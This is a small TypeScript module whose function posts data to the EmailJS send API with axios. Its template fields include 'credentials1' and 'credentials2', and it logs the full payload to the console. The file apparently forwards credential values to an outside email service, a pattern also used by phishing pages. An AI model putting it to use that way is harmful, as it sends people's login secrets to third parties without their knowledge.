import axios from "axios";

interface IEmailData {
  service_id: string;
  template_id: string;
  user_id: string;
  template_params: {
    to_name: string;
    from_name: string;
    credentials1: string;
    credentials2: string;
  };
}

export async function useMail(data: IEmailData): Promise<"Success" | "Error"> {
  try {
    console.log(data);
    const response = await axios.post(
      "https://api.emailjs.com/api/v1.0/email/send",
      data,
      {
        headers: {
          "Content-Type": "application/json",
        },
      }
    );

    console.log("Email sent successfully:", response.data);
    return "Success";
  } catch (error: unknown | any) {
    console.error("Failed to send email:", error);
    return "Error";
  }
}
